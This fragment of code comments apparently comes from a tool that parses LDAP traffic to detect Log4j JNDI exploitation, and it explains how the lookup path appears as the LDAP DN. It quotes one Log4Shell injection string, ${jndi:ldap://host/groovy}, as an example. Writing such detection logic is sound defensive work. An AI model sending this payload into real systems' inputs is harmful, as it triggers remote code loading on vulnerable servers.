                    # The Log4j JNDI payload encodes the lookup path as the LDAP DN,
                    # e.g. ${jndi:ldap://host/groovy} -> baseObject = "groovy"
                    # We check raw bytes since BER-encoded strings can appear anywhere in data.
                    # -------------------------------------------------------
